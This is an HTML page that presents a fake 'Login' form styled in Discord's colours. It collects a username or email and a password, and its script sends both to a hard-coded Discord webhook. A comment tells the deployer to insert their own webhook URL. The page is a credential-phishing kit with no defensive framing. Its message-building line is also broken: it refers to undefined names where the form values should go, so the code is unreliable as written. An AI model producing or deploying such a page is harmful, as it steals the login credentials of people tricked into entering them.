<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Form</title>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background: #5865F2;
        }

        .box {
            width: 90%;
            max-width: 450px;
            background: white;
            padding: 35px;
            border-radius: 15px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25);
        }

        h1 {
            text-align: center;
            margin-bottom: 10px;
            color: #222;
        }

        .description {
            text-align: center;
            color: #666;
            margin-bottom: 25px;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
        }

        input:focus {
            border-color: #5865F2;
        }

        button {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            background: #5865F2;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background: #4752C4;
        }

        button:disabled {
            background: #999;
            cursor: not-allowed;
        }

        #status {
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
        }

        .success {
            color: #20a464;
        }

        .error {
            color: #d93025;
        }
    </style>
</head>

<body>

    <div class="box">
        <h1>Login</h1>

        <p class="description">
            Enter your email address and password.
        </p>

        <form id="messageForm">

            <input
                type="text"
                id="text1"
                placeholder="username/emailaddress"
                required
            >

            <input
                type="text"
                id="text2"
                placeholder="passwoard"
                required
            >

            <button type="submit" id="sendButton">
                Send
            </button>

            <div id="status"></div>

        </form>
    </div>


    <script>

        // =====================================================
        // PUT YOUR DISCORD WEBHOOK URL BETWEEN THE QUOTES BELOW
        // =====================================================

        const DISCORD_WEBHOOK =
            "https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3";


        // =====================================================
        // DO NOT CHANGE BELOW THIS LINE
        // =====================================================

        const form = document.getElementById("messageForm");
        const button = document.getElementById("sendButton");
        const status = document.getElementById("status");

        form.addEventListener("submit", async function(event) {

            event.preventDefault();

            const text1 = document.getElementById("text1").value;
            const text2 = document.getElementById("text2").value;

            button.disabled = true;
            button.textContent = "Sending...";
            status.textContent = "";
            status.className = "";

            const message = {
                content:
                    "**New Submission**\n\n" +
                    "**Text 1:**\n" + username or email + "\n\n" +
                    "**Text 2:**\n" + password
            };

            try {

                const response = await fetch(DISCORD_WEBHOOK, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(message)
                });

                if (!response.ok) {
                    throw new Error("Discord returned an error");
                }

                status.textContent = "Sent successfully!";
                status.className = "success";

                form.reset();

            } catch (error) {

                console.error(error);

                status.textContent =
                    "Failed to send. Check your webhook URL.";

                status.className = "error";

            } finally {

                button.disabled = false;
                button.textContent = "Send";

            }

        });

    </script>

</body>
</html>
